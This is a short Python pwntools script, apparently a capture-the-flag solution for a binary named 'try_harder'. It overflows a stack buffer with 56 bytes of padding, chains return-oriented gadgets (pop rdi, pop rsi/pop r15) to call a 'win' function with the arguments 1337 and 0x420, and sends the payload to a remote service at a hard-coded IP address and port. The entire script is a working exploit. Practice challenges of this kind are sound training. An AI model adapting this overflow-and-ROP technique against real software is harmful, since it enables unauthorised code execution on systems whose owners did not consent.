from pwn import *
context.terminal = ['tmux', 'new-window']

binary = './try_harder'

#p = process(binary)
#p = gdb.debug(binary, gdbscript="""""")
p = remote("51.124.222.205", 13372)

payload = (48 + 8) * b'A'

payload += p64(0x000000000040133b) #  pop rdi ; ret
payload += p64(1337) # first fucntion value
payload += p64(0x0000000000401339) # pop rsi ; pop r15 ; ret
payload += p64(0x420) # second fucntion value
payload += p64(0x69) # pop r15
payload += p64(0x0000000000401166) # win fucntion address

p.sendline(payload)

p.interactive()
p.close()
